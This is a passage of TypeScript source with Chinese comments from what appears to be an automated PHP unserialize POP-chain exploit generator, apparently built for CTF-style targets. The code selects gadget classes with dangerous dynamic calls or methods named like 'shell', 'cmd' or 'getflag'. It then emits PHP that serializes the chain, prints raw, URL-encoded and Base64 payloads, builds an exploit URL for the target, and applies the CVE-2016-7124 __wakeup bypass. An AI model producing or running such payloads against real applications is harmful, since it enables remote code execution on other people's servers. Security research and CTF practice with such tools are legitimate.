            code += `\n// ${obj.className} 对象\n`;
            code += `${obj.varName} = new ${obj.className}();\n`;
            for (const prop of obj.props) {
                code += `${obj.varName}->${prop.name} = ${prop.value};  // ${prop.comment}\n`;
            }
        }

        // 生成入口对象
        code += `\n// 入口对象: ${entry.className}\n`;
        code += `$exploit = new ${entry.className}();\n`;
        for (const prop of entryProps) {
            code += `$exploit->${prop.name} = ${prop.value};  // ${prop.comment}\n`;
        }

        code += `\n// === 生成 Payload ===\n`;
        code += `$payload = serialize($exploit);\n`;
        code += `echo "Payload (raw):\\n" . $payload . "\\n\\n";\n`;
        code += `echo "Payload (URL encoded):\\n" . urlencode($payload) . "\\n\\n";\n`;
        code += `echo "Payload (Base64):\\n" . base64_encode($payload) . "\\n\\n";\n`;
        
        // 生成完整的利用 URL
        if (this.unserializeParam.paramName && this.unserializeParam.paramSource) {
            const method = this.unserializeParam.paramSource === '$_POST' ? 'POST' : 'GET';
            code += `\n// === 完整利用 URL ===\n`;
            if (method === 'GET') {
                code += `echo "利用URL:\\n" . "http://target/index.php?${this.unserializeParam.paramName}=" . urlencode($payload) . "\\n\\n";\n`;
            } else {
                code += `// POST 请求: ${this.unserializeParam.paramName}=<urlencode($payload)>\n`;
            }
        } else {
            code += `\n// === 完整利用 URL (请替换参数名) ===\n`;
            code += `echo "利用URL:\\n" . "http://target/index.php?data=" . urlencode($payload) . "\\n\\n";\n`;
        }
        
        // __wakeup 绕过提示
        if (objectVars.length > 0) {
            code += `\n// === 绕过 __wakeup (CVE-2016-7124, PHP < 7.4.26) ===\n`;
            code += `$payload_bypass = $payload;\n`;
            for (const obj of objectVars) {
                code += `$payload_bypass = preg_replace('/${obj.className}:(\\d+):/', '${obj.className}:' . ('\\$1' + 1) . ':', $payload_bypass);\n`;
            }
            code += `echo "Payload (bypass __wakeup):\\n" . urlencode($payload_bypass) . "\\n";\n`;
        }

        return code;
    }

    /**
     * 找到有危险调用的 gadget
     */
    private findGadgetWithDangerousMethod(allGadgets: POPGadget[], excludeClass: string): POPGadget | null {
        // 优先找有 ($this->func)($arg) 模式的普通方法
        for (const g of allGadgets) {
            if (g.className === excludeClass) continue;
            if (g.isMagic) continue;  // 排除魔术方法
            
            for (const dc of g.dangerousCalls) {
                if (dc.isDynamic && dc.pattern.includes('($this->')) {
                    return g;
                }
            }
        }
        
        // 其次找任意有危险调用的方法
        for (const g of allGadgets) {
            if (g.className === excludeClass) continue;
            if (g.dangerousCalls.length > 0) {
                return g;
            }
        }
        
        return null;
    }

    /**
     * 找到可用于无参 Callable 的方法
     * 用于 ($this->c)() 这种无参调用场景
     */
    private findUsefulMethodForCallback(allGadgets: POPGadget[], excludeClass: string): { className: string, methodName: string } | null {
        // 遍历所有类，找有用的公开方法
        for (const [className, classInfo] of this.classMap) {
            if (className === excludeClass) continue;
            
            for (const method of classInfo.methods) {
                // 跳过魔术方法和私有方法
                if (method.isMagic) continue;
                if (method.visibility === 'private') continue;
                
                // 找无参数或可选参数的方法
                if (method.parameters.length === 0) {
                    // 检查方法体是否有有趣的操作（读取敏感信息、执行命令等）
                    const gadget = allGadgets.find(g => 
                        g.className === className && g.methodName === method.name
                    );
                    
                    // 有危险调用的方法优先
                    if (gadget && gadget.dangerousCalls.length > 0) {
                        return { className, methodName: method.name };
                    }
                    
                    // 或者方法名暗示有用（test, getFlag, run, exec 等）
                    const usefulNames = ['test', 'run', 'exec', 'execute', 'getflag', 'flag', 'admin', 'shell', 'cmd'];
                    if (usefulNames.some(n => method.name.toLowerCase().includes(n))) {
                        return { className, methodName: method.name };
                    }
                }
            }
        }
        
        // 退而求其次，找任何公开的无参方法
        for (const [className, classInfo] of this.classMap) {
            if (className === excludeClass) continue;
            
            for (const method of classInfo.methods) {
                if (method.isMagic) continue;
                if (method.visibility === 'private') continue;
                if (method.parameters.length === 0) {
                    return { className, methodName: method.name };
                }
            }
        }
        
        return null;
    }

    private generateDataFlow(steps: ChainStep[]): string {
        return steps.map((step, i) => {
            let flow = `[${i + 1}] ${step.className}::${step.methodName}\n`;
            flow += `    触发: ${step.trigger}\n`;
            if (step.reads.length) flow += `    读取: ${step.reads.join(', ')}\n`;
            if (step.calls.length) flow += `    调用: ${step.calls.join(', ')}\n`;
            if (step.operations.length) flow += `    操作: ${step.operations.join('; ')}\n`;
            return flow;
        }).join('\n');
    }

    private generateDescription(steps: ChainStep[]): string {
        return steps.map((step, i) => 
            `[${i + 1}] ${step.className}::${step.methodName} (${step.trigger})`
        ).join(' → ');
    }

    /**
     * 公开方法：获取所有 Gadgets
     */
    public getGadgets(code: string): POPGadget[] {
        this.sourceCode = code;
        try {
            this.ast = this.parser.parseCode(code, 'php');
        } catch (e) {
            return [];
        }
        this.buildClassMap();
        return this.findAllGadgets();
    }
}
